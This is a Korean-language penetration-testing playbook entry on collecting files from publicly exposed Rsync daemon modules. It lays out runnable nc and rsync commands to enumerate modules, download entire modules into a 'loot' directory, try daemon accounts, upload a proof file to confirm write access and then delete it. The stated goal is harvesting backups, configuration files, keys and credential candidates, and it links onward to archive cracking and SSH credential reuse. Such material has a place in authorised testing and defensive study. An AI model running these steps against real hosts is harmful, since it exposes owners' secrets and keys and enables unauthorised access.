---
tags:
  - 환경/unix
  - 서비스/rsync
시작조건: ["Rsync 서비스 접근 가능", "공개 모듈 또는 유효한 Rsync 계정"]
필요조건: ["Rsync daemon 접근", "모듈 이름 또는 공개 목록"]
결과: ["Rsync 모듈 파일", "백업·설정·키·자격 증명 후보", "선택적으로 확인한 모듈 쓰기 권한"]
---

# Rsync 공개 모듈 수집

## 한 줄 판단

현재 명령 실행 위치에서 대상 Rsync 873/TCP에 연결할 수 있으면 공개 모듈과 실제 파일 읽기 범위를 확인해 필요한 백업·설정·키 파일을 로컬로 수집하고, 필요하면 고유 검증 파일로 모듈 쓰기 권한을 확인한다.

## 사용할 때

- Rsync daemon의 module 목록이 공개될 때.
- 백업·배포·홈 디렉터리 module에서 설정·키 파일을 조사할 때.
- module 목록, `--list-only`와 실제 파일 동기화를 구분해야 할 때.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| daemon 접근 | `<TARGET>:873` 연결 | `@RSYNCD` greeting | Rsync over SSH와 구분 |
| module | 공개 목록 또는 알려진 이름 | `rsync rsync://<TARGET>/` | 목록 거부 시 정확한 module명을 직접 확인 |
| 파일 READ | module별 목록과 동기화 | `--list-only`, 실제 다운로드 | 인증 요구와 read-only·path 오류를 구분 |
| 로컬 저장 위치 | 이번 실행에서 만든 빈 디렉터리 | `mktemp -d` 결과 | 기존 디렉터리에 덮어쓰지 않음 |

## 실행

```bash
nc -nv <TARGET> 873
rsync rsync://<TARGET>/
rsync --list-only rsync://<TARGET>/<MODULE>/
LOOT_DIR="$(mktemp -d ./loot-rsync.XXXXXX)"
rsync -av rsync://<TARGET>/<MODULE>/ "$LOOT_DIR/"
find "$LOOT_DIR" -maxdepth 2 -type f -printf '%p %s bytes\n'
find "$LOOT_DIR" -type f -exec sha256sum -- {} +
```

확인할 출력:

- daemon greeting, module 이름과 설명.
- 원격 파일 mode·owner·group과 목록.
- 실제 다운로드된 파일의 크기·hash와 전송 요약.

### 인증이 필요한 daemon module

Rsync daemon의 계정은 SSH 계정과 같은 주체라고 가정하지 않는다. module이 `auth required`를 반환하고 승인된 daemon 계정이 있을 때는 사용자명만 URL에 넣고 비밀번호 prompt로 입력한다.

```bash
rsync --list-only rsync://<RSYNC_USER>@<TARGET>/<MODULE>/
rsync -av rsync://<RSYNC_USER>@<TARGET>/<MODULE>/ "$LOOT_DIR/"
```

`@ERROR: auth failed on module`이면 daemon 사용자명·secrets 정책을 다시 확인한다. 계정·비밀번호 보유만으로 module READ를 확정하지 않고 실제 목록과 다운로드를 확인한다.

### 모듈 쓰기 권한 확인

고유 검증 파일을 업로드하고 같은 원격 경로를 다시 조회한다.

```bash
PROOF="rsync-proof-$(date -u +%Y%m%dT%H%M%SZ)-$$.txt"
printf 'Rsync write verification: %s\n' "$PROOF" > "$PROOF"
rsync -av "$PROOF" "rsync://<TARGET>/<MODULE>/$PROOF"
rsync --list-only "rsync://<TARGET>/<MODULE>/$PROOF"
```

확인할 출력:

- 업로드 전송 요약과 원격 목록의 정확한 파일명·크기.
- module 목록 조회와 실제 파일 쓰기 권한을 구분한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| module·목록 반환 | 공개 module 메타데이터와 READ 후보 | 공개 파일 목록 | 필요한 파일만 선택해 동기화 |
| 다운로드와 로컬 hash 확인 | module 파일을 온전히 읽음 | 백업·설정·키 파일 수집 | 파일별 자격 증명·키 확인 |
| `auth required` | daemon account 또는 secrets 정책 필요 | 익명 접근 불가 | 보유 계정의 대상·형식 확인 |
| 인증 뒤 목록만 성공 | daemon 인증과 경로 열거 가능 | 인증된 READ 후보 | 필요한 파일 하나를 동기화해 내용 접근 확인 |
| 검증 파일 업로드와 원격 조회 성공 | 해당 module에 새 파일 생성 가능 | Rsync 쓰기 권한 | module의 실제 사용 경로와 파일 처리 방식을 별도로 확인 |

## 확인할 출력과 권한

- module 목록은 모든 module의 읽기 권한을 뜻하지 않는다.
- `--list-only`와 실제 파일 내용 수집을 구분한다.

## 변경 영향과 복구

다운로드는 대상 module을 변경하지 않지만 공격 호스트의 `$LOOT_DIR`에 파일을 만든다. 수집본은 Vault 밖의 승인된 위치에서 보존·폐기하며, 기존 디렉터리와 섞이지 않게 이번 `mktemp` 경로를 기록한다.

원격 module에서 단일 파일 삭제를 검증할 때는 빈 디렉터리와 include 규칙으로 이번 파일만 대상으로 한다.

```bash
EMPTY_DIR="$(mktemp -d ./empty-rsync.XXXXXX)"
rsync -av --delete --include "/$PROOF" --exclude '*' "$EMPTY_DIR/" "rsync://<TARGET>/<MODULE>/"
rsync --list-only "rsync://<TARGET>/<MODULE>/$PROOF"
rm -f -- "$PROOF"
rmdir -- "$EMPTY_DIR"
```

- 삭제 명령의 include 대상이 고유 검증 파일 하나인지 다시 확인한다.
- module이 삭제를 허용하지 않으면 서버 측에서 제거할 별도 경로가 없는 상태이므로 쓰기 확인을 시작하지 않는다.
- 수집본을 폐기하기로 했다면 `$LOOT_DIR`가 이번 실행의 `mktemp` 결과인지 다시 확인한 뒤 `find "$LOOT_DIR" -depth -delete`로 그 경로 아래의 산출물만 제거하고 `test ! -e "$LOOT_DIR"`로 확인한다. 보존할 자료가 있으면 이 명령을 실행하지 않는다.

## 참고 링크

- [rsync(1) official manual](https://rsync.samba.org/ftp/rsync/rsync.1.html)
- [rsyncd.conf(5) official manual](https://rsync.samba.org/ftp/rsync/rsyncd.conf.5.html)

## 후속 공격 연결

- 수집 파일: [[보호된 파일 및 아카이브 크래킹]], [[SSH credential 및 키 인증 검증]]

## 관련 서비스

- [[Rsync 서비스]]

## 관련 상태 라우터

- [[파일 서비스 접근 후 자격 증명과 초기 접근 연결]]
- [[확보한 자격 증명으로 원격 접근 경로 선택]]

## 관련 도구

- [[rsync]]
- [[netcat]]
